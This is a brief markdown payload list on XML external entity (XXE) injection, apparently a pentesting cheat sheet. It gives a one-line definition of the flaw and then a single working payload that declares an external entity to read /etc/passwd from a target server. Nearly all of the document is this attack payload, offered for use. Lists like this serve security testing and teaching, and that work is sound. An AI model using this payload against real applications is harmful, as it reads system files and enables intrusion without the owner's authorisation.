# XXE payloads

[XML external entity injection (also known as XXE)](https://portswigger.net/web-security/xxe) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.

## Payloads

Show /etc/passwd.
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
